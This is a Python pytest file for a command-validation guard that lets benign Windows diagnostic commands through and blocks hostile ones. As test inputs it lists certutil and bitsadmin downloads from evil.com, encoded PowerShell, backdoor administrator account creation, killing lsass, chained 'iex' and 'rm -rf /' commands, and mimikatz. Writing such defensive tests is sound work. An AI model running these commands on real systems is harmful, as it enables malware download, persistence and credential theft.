"""Security Tests for Fix H4: Full Command and Argument AST Guard."""

import pytest
from hub_security.command_guard import (
    CommandSecurityViolation,
    validate_command_and_arguments,
    validate_command_or_raise,
)


def test_benign_commands_with_valid_arguments_pass():
    """Verify that legitimate diagnostic and recovery commands pass inspection."""
    valid_commands = [
        "Get-Service -Name Spooler",
        "Restart-Service -Name Spooler -Force",
        "ipconfig /flushdns",
        "tasklist /FI \"IMAGENAME eq notepad.exe\"",
        "Test-NetConnection -ComputerName 10.0.0.5 -Port 53",
    ]
    for cmd in valid_commands:
        is_valid, reason = validate_command_and_arguments(cmd)
        assert is_valid is True, f"Expected '{cmd}' to pass, but failed: {reason}"


def test_command_targeting_protected_os_processes_blocked():
    """Verify that attempting to terminate critical OS processes like svchost or lsass is blocked."""
    lethal_commands = [
        "taskkill /F /IM svchost.exe",
        "taskkill /IM lsass.exe",
        "taskkill /IM csrss.exe /F",
    ]
    for cmd in lethal_commands:
        is_valid, reason = validate_command_and_arguments(cmd)
        assert is_valid is False
        assert "protected system process" in reason
        with pytest.raises(CommandSecurityViolation):
            validate_command_or_raise(cmd)


def test_prohibited_argument_flags_blocked():
    """Verify that dangerous execution flags and utilities are blocked."""
    exploit_commands = [
        "powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=",
        "powershell -encodedcommand SGVsbG8gV29ybGQ=",
        "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
        "bitsadmin /transfer job http://evil.com/malware.exe C:\\malware.exe",
        "net user backdoor P@ssw0rd123 /add",
        "net localgroup administrators backdoor /add",
    ]
    for cmd in exploit_commands:
        is_valid, reason = validate_command_and_arguments(cmd)
        assert is_valid is False
        assert "Prohibited exploit pattern detected" in reason
        with pytest.raises(CommandSecurityViolation):
            validate_command_or_raise(cmd)


def test_shell_chaining_and_redirection_blocked():
    """Verify that operators like &&, |, ;, and redirection are blocked in command arguments."""
    chaining_commands = [
        "Get-Service Spooler && net user hacker /add",
        "ipconfig /flushdns | powershell -c iex",
        "Restart-Service Spooler; rm -rf /",
        "Get-Process > C:\\sensitive_data.txt",
    ]
    for cmd in chaining_commands:
        is_valid, reason = validate_command_and_arguments(cmd)
        assert is_valid is False
        assert "chaining operator" in reason
        with pytest.raises(CommandSecurityViolation):
            validate_command_or_raise(cmd)


def test_binary_catalog_allowlist_enforcement():
    """Verify that executables outside the approved catalog are rejected."""
    allowed = {"get-service", "restart-service", "ipconfig"}
    assert validate_command_and_arguments("ipconfig /flushdns", allowed_binaries=allowed)[0] is True

    # Unauthorized binary
    is_valid, reason = validate_command_and_arguments("mimikatz.exe privilege::debug", allowed_binaries=allowed)
    assert is_valid is False
    assert "not in the allowed binaries catalog" in reason

